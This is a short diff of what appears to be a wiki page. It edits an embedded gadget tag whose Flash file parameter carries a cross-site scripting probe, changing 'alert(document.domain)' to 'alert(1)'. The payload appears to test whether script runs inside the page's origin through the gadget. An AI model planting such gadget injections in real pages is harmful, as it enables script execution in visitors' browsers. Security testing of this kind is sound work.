@@ -1,4 +1,4 @@
-<wiki:gadget url="https://ab56117cb9163641ca621ac5d4df8b73601b2f7a.googledrive.com/host/0B4yfJJJSNrfubzJEUkxIYm1PcHM/flash-container.xml" width="200" height="20000" border="0" up_File="https://eeeeeeede.googlecode.com/svn/wiki/xssproject.swf?alert(document.domain);" /> 
+<wiki:gadget url="https://ab56117cb9163641ca621ac5d4df8b73601b2f7a.googledrive.com/host/0B4yfJJJSNrfubzJEUkxIYm1PcHM/flash-container.xml" width="200" height="200" border="0" up_File="https://eeeeeeede.googlecode.com/svn/wiki/xssproject.swf?alert(1);" /> 
 
 <wiki:gadget url="https://ab56117cb9163641ca621ac5d4df8b73601b2f7a.googledrive.com/host/0B4yfJJJSNrfubzJEUkxIYm1PcHM/flash-container.xml" width="2000"  height="200" border="0" /> 
 
